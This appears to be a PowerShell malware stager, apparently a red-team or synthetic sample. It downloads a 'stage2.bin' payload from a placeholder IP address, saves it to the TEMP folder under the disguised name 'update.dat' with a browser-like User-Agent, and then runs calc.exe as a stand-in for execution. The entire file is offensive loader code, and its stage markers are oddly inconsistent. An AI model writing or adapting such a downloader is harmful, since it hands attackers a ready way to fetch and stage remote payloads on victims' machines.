[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://192.0.2.20/cdn/stage2.bin',
    [string]$PayloadPath = "$env:TEMP\update.dat",
    [int]$ConnectionTimeout = 225,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Invoke-Stage2Download -SourceUrl $RemoteUrl -DestinationPath $PayloadPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($ResultObject) {
    Start-Process -FilePath "calc.exe"
}

Write-Verbose "stage marker 13 reached"
Write-Output "stage 9 initialized"
